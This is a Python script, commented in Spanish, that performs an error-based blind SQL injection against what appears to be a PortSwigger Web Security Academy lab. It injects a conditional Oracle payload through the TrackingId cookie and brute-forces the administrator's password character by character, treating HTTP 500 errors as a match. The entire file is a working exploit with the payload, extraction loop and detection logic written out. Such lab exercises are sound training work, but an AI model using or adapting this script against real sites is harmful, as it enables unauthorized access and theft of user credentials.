from termcolor import colored
import requests
import sys
import signal
import string
import time
from pwn import log

# Variables globales
p1 = None
p2 = None
password = ""

def def_handler(sig, frame):
    print(colored("\n\n[! Saliendo...]\n", "red"))
    if p1:
        p1.failure("Ataque detenido por el usuario")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
characters = string.ascii_lowercase + string.digits

def makeSQLI():
    global p1, p2, password
    password = ""

    p1 = log.progress("Blind SQLI (Error-based)")
    p2 = log.progress("Password")

    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(1)

    # --- Obtener respuesta base (sin inyección) ---
    base_cookies = {
        'TrackingId': "O4bH8GfTVvSHrRDn",
        'session': "JPsPdJeTe8BXPDpdrAyo6kbdwW2Vw2YV"  # ← ¡REEMPLAZA!
    }
    try:
        base_r = requests.get(
            "https://0aca00230401368280c50da5006d002c.web-security-academy.net/",
            cookies=base_cookies,
            timeout=10
        )
        base_text = base_r.text
        base_status = base_r.status_code
        p1.status("Respuesta base obtenida (status: %d)" % base_status)
    except Exception as e:
        p1.failure("Error conectando al sitio base: %s" % e)
        sys.exit(1)

    for position in range(1, 21):
        found = False
        for character in characters:
            payload = f"O4bH8GfTVvSHrRDn' || (SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')-- -"
            
            cookies = {
                'TrackingId': payload,
                'session': "JPsPdJeTe8BXPDpdrAyo6kbdwW2Vw2YV"  # ← ¡REEMPLAZA!
            }

            p1.status(f"Pos {position} | Probando: {character}")

            try:
                r = requests.get(
                    "https://0aca00230401368280c50da5006d002c.web-security-academy.net/",
                    cookies=cookies,
                    timeout=10
                )
            except requests.RequestException as e:
                p1.failure(f"Error de red: {e}")
                continue

            # --- DETECCIÓN DE ERROR ---
            error_detected = False

            # Opción 1: Código 500
            if r.status_code == 500:
                error_detected = True
            # Opción 2: "Internal Server Error" en el body
            elif "Internal Server Error" in r.text:
                error_detected = True
            # Opción 3: Contenido muy corto o diferente
            elif len(r.text) < len(base_text) * 0.8:
                error_detected = True

            if error_detected:
                password += character
                p2.status(password)
                p1.success(f"Carácter {position} encontrado: {character}")
                found = True
                break

            time.sleep(0.3)  # Evitar rate limit

        if not found:
            p1.success("¡Contraseña completa!")
            p2.success(password)
            print(colored(f"\n[+] Contraseña del administrador: {password}", "green"))
            return

    p1.success("¡Ataque completado! (20 caracteres)")
    p2.success(password)
    print(colored(f"\n[+] Contraseña del administrador: {password}", "green"))

if __name__ == '__main__':
    makeSQLI()